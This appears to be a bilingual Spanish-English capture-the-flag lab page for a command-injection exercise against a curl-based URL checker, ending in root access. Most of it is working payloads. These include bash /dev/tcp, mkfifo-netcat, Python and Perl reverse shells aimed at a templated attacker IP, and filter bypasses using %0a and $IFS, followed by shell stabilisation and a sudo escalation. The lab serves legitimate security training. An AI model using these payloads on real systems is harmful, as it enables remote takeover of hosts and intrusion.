Esta herramienta de diagnóstico comprueba la disponibilidad de una URL remota ejecutando curl en el servidor. El parámetro URL se pasa sin sanitizar a la shell. El proceso corre como el usuario admin (sin privilegios de root). Consigue una reverse shell y luego escala privilegios hasta root.

This diagnostic tool checks remote URL availability by running curl on the server. The URL parameter is passed unsanitized to the shell. The process runs as the admin user (no root privileges). Get a reverse shell and then escalate privileges to root.

Objetivos

  • Inyectar un payload de reverse shell en el campo URL. Inject a reverse shell payload into the URL field.
  • Recibir la conexión con nc -lvnp 4444 en tu máquina atacante. Receive the connection with nc -lvnp 4444 on your attacker machine.
  • Confirmar que eres admin con id y leer /home/admin/user.txt. Confirm you are admin with id and read /home/admin/user.txt.
  • Escalar privilegios hasta root y leer /root/root.txt. Escalate privileges to root and read /root/root.txt.

Concepto

El servidor ejecuta su -s /bin/sh admin -c "curl -s -o /dev/null -w '%{http_code}' --max-time 5 URL" con shell=True. Cualquier separador de comandos en la URL se interpreta por la shell de admin, permitiendo ejecutar código arbitrario. La reverse shell llega como admin (UID 1000), no como root — es necesario escalar privilegios para leer /root/root.txt.

Paso 0 — Preparar el listener

En tu máquina atacante (Kali / máquina con acceso de red al servidor), antes de enviar el payload:

nc -lvnp 4444

Easy — Bash TCP reverse shell

Sin filtrado. Cualquier separador funciona.

; bash -i >& /dev/tcp/{{ client_ip }}/4444 0>&1

Alternativas con otros separadores:

| bash -i >& /dev/tcp/{{ client_ip }}/4444 0>&1
&& bash -i >& /dev/tcp/{{ client_ip }}/4444 0>&1

Si bash no está disponible, usar sh:

; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc {{ client_ip }} 4444 > /tmp/f

Medium — Newline bypass (%0a)

Filtra ; y |. Usa && o el newline URL-encoded via Burp Suite.

# Con &&
https://example.com && bash -i >& /dev/tcp/{{ client_ip }}/4444 0>&1

# Con newline (intercepta en Burp Repeater y pon %0a en el body):
url=https://example.com%0abash -i >& /dev/tcp/{{ client_ip }}/4444 0>&1

Python como alternativa (sin redirectores >):

https://x && python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{{ client_ip }}",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh"])'

Hard — Python/Perl one-liner + $IFS

Filtra ; | && > < & `. El truco: Python no necesita redirectores de shell para la reverse shell. Usa %0a (newline) para separar comandos y $IFS si necesitas espacios sin metacaracteres.

# En Burp Suite, envía en el body (el %0a es un newline literal):
url=https://x%0apython3${IFS}-c${IFS}'import socket,subprocess,os;s=socket.socket();s.connect(("{{ client_ip }}",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh"])'

Alternativa con Perl:

url=https://x%0aperl${IFS}-e${IFS}'use Socket;$i="{{ client_ip }}";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

Estabilizar la shell

Una vez dentro, la shell es dumb (sin TTY). Para mejorarla:

# En la shell recibida:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z para ponerla en background

# En tu terminal local:
stty raw -echo; fg

# De vuelta en la shell:
export TERM=xterm

Escalada de privilegios

La shell llega como admin. Para escalar a root:

# Confirmar usuario actual
id
# uid=1000(admin) gid=1000(admin) ...

# Comprobar sudo
sudo -l
# (ALL) NOPASSWD: ALL

# Escalar a root
sudo su -
# o bien
sudo bash

# Leer la flag de root
cat /root/root.txt

Herramientas

netcat Burp Suite bash python3 perl sudo
